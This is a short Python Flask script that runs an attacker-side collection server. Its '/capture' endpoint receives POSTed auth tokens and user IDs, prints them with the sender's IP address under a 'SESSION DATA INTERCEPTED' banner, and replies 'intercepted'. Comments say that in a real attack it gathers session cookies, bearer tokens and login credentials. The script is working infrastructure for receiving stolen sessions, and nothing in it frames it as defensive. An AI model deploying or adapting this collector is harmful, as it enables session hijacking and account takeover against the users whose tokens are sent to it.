from flask import Flask, request, jsonify
import datetime

app = Flask(__name__)

@app.route('/capture', methods=['POST'])
def capture_session():
    data = request.json
    
    # In a real attack, we are looking for:
    # 1. The Session ID (Cookie)
    # 2. The Auth Token (Bearer Token)
    # 3. The User's Login Credentials
    
    auth_token = data.get('auth_token')
    user_id = data.get('user_id')
    ip_address = request.remote_addr

    print("\n" + "!"*40)
    print(f"[*] CRITICAL: SESSION DATA INTERCEPTED")
    print(f"[*] TIMESTAMP: {datetime.datetime.now()}")
    print(f"[*] TARGET USER: {user_id}")
    print(f"[*] IP ADDRESS: {ip_address}")
    print(f"[*] AUTH TOKEN: {auth_token}")
    print("!"*40 + "\n")

    return jsonify({"status": "intercepted"}), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
